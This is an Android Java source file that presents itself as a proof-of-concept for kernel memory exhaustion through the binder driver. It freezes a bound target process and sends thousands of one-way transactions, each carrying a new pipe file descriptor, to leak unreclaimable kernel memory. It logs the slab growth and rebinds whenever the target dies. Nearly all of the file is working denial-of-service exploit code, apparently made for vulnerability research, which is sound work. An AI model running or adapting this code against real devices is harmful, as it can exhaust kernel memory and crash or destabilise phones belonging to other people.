package com.research.binderleak;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.util.Log;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

public class MainActivity extends Activity {
    private static final String TAG = "BinderLeakPoC";
    private static final int TF_UPDATE_TXN = 0x40;

    private volatile IBinder mTargetBinder;
    private volatile CountDownLatch mBindLatch;
    private volatile boolean mRunning = true;

    private final ServiceConnection mConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mTargetBinder = service;
            Log.w(TAG, "[+] Bound (binder=" + service + ")");
            CountDownLatch l = mBindLatch;
            if (l != null) l.countDown();
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            mTargetBinder = null;
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.w(TAG, "=== KERNEL MEMORY EXHAUSTION — MAX IMPACT PoC ===");
        Log.w(TAG, "PID=" + android.os.Process.myPid() + " UID=" + android.os.Process.myUid());

        mBindLatch = new CountDownLatch(1);
        bindService(new Intent(this, LeakTargetService.class),
                mConnection, Context.BIND_AUTO_CREATE);

        new Thread(this::stressLoop, "leak-engine").start();
    }

    private void stressLoop() {
        String target = getPackageName() + ":target";

        waitForBinder();

        long totalLeaked = 0;
        long totalSent = 0;
        int cycle = 0;
        int rebinds = 0;
        long startTime = System.currentTimeMillis();

        String baselineSlab = readMemField("SUnreclaim");
        String baselineAvail = readMemField("MemAvailable");
        Log.w(TAG, "BASELINE SUnreclaim=" + baselineSlab + " MemAvail=" + baselineAvail);

        freeze(target);
        sleep(500);

        while (mRunning) {
            cycle++;

            if (mTargetBinder == null) {
                rebinds++;
                Log.w(TAG, "[!] Binder lost, rebinding (#" + rebinds + ")...");
                rebind();
                if (!waitForBinder()) {
                    Log.w(TAG, "[X] Rebind failed, retrying in 3s");
                    sleep(3000);
                    continue;
                }
                freeze(target);
                sleep(500);
                continue;
            }

            int[] r = sendLeakBurstUniqueFDs(2000);
            totalSent += r[0];
            totalLeaked += Math.max(0, r[0] - 1);

            if (r[1] > 500) {
                rebinds++;
                Log.w(TAG, "[!] Cycle " + cycle + ": target dead (" +
                        r[1] + " dead), rebinding (#" + rebinds + ")");
                rebind();
                if (!waitForBinder()) {
                    sleep(3000);
                    continue;
                }
                freeze(target);
                sleep(500);
                continue;
            }

            if (cycle % 5 == 0) {
                long elapsed = (System.currentTimeMillis() - startTime) / 1000;
                long leakedMB = totalLeaked * 320 / (1024 * 1024);
                String slab = readMemField("SUnreclaim");
                String avail = readMemField("MemAvailable");
                String free = readMemField("MemFree");
                Log.w(TAG, String.format(
                        "[%ds] cyc=%d sent=%d leaked=%d (~%dMB) rebinds=%d SUnreclaim=%s Avail=%s Free=%s",
                        elapsed, cycle, totalSent, totalLeaked, leakedMB,
                        rebinds, slab, avail, free));
            }

            if (cycle % 25 == 0) {
                freeze(target);
            }
        }

        long elapsed = (System.currentTimeMillis() - startTime) / 1000;
        Log.w(TAG, "=== STRESS TEST COMPLETE ===");
        Log.w(TAG, "Duration: " + elapsed + "s  Leaked: " + totalLeaked +
                " SUnreclaim=" + readMemField("SUnreclaim"));
    }

    private int[] sendLeakBurstUniqueFDs(int count) {
        int sent = 0, dead = 0, errors = 0;
        int subBatch = 500;

        for (int start = 0; start < count && dead < count / 4; start += subBatch) {
            int thisSize = Math.min(subBatch, count - start);
            ParcelFileDescriptor[] pfds = new ParcelFileDescriptor[thisSize];

            for (int j = 0; j < thisSize; j++) {
                try {
                    ParcelFileDescriptor[] pipe = ParcelFileDescriptor.createPipe();
                    pfds[j] = pipe[0];
                    pipe[1].close();
                } catch (IOException e) {
                    pfds[j] = null;
                }
            }

            for (int i = 0; i < thisSize; i++) {
                if (pfds[i] == null) { errors++; continue; }
                Parcel data = Parcel.obtain();
                boolean recycled = false;
                try {
                    data.writeFileDescriptor(pfds[i].getFileDescriptor());
                    mTargetBinder.transact(0x1337, data, null,
                            IBinder.FLAG_ONEWAY | TF_UPDATE_TXN);
                    sent++;
                } catch (RemoteException e) {
                    dead++;
                    if (dead > count / 4) { data.recycle(); recycled = true; break; }
                } catch (NullPointerException e) {
                    dead += (count - start - i);
                    data.recycle();
                    recycled = true;
                    break;
                } catch (Exception e) {
                    errors++;
                } finally {
                    if (!recycled) data.recycle();
                }
            }

            for (int j = 0; j < thisSize; j++) {
                if (pfds[j] != null) {
                    try { pfds[j].close(); } catch (Exception e) {}
                }
            }
        }

        return new int[]{sent, dead, errors};
    }

    private boolean waitForBinder() {
        try {
            for (int i = 0; i < 10; i++) {
                CountDownLatch l = mBindLatch;
                if (l != null) l.await(2, TimeUnit.SECONDS);
                if (mTargetBinder != null) return true;
            }
        } catch (Exception e) {}
        return mTargetBinder != null;
    }

    private void rebind() {
        try { unbindService(mConnection); } catch (Exception e) {}
        mTargetBinder = null;
        sleep(1500);
        mBindLatch = new CountDownLatch(1);
        try {
            bindService(new Intent(this, LeakTargetService.class),
                    mConnection, Context.BIND_AUTO_CREATE);
        } catch (Exception e) {
            Log.w(TAG, "Rebind exception: " + e.getMessage());
        }
    }

    private void freeze(String process) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"am", "freeze", process});
            int rc = p.waitFor();
            byte[] buf = new byte[512];
            int n = p.getInputStream().read(buf);
            String out = n > 0 ? new String(buf, 0, n).trim() : "";
            Log.w(TAG, "Freeze: rc=" + rc + " " + out);
        } catch (Exception e) {
            Log.w(TAG, "Freeze failed: " + e.getMessage());
        }
    }

    private String readMemField(String field) {
        try {
            BufferedReader br = new BufferedReader(new FileReader("/proc/meminfo"));
            String line;
            while ((line = br.readLine()) != null) {
                if (line.startsWith(field)) {
                    br.close();
                    String[] parts = line.split("\\s+");
                    return parts.length >= 2 ? parts[1] + "kB" : line;
                }
            }
            br.close();
        } catch (Exception e) {}
        return "?";
    }

    private void sleep(long ms) {
        try { Thread.sleep(ms); } catch (Exception e) {}
    }

    @Override
    protected void onDestroy() {
        mRunning = false;
        try { unbindService(mConnection); } catch (Exception e) {}
        super.onDestroy();
    }
}
